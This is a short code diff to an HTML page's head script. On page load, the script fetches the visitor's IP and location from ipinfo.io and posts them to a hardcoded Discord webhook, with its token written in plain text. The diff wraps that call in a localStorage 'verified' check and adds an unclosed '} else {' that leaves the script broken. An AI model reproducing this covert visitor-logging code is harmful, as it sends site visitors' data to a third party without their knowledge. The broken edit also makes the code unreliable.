@@ -7,6 +7,7 @@
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
 	<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 	<script>
+		if (localStorage.getItem("verified") === "true") {  
 		$.get("https://ipinfo.io", function(response) {
 			const webhook_url = "https://discord.com/api/webhooks/1544367169104650321/axsAiwkYPWX127hUE3d5WcdZwR18J_6JE-D3TzzL6dNjUmCgD9ylDsXRsNdtd9w16RIt";
 			const main = {
@@ -74,6 +75,7 @@
 				'embeds': [main],
 			}));
 		}, "json");
+		} else {
 	</script>
 </head>
 	<body>  
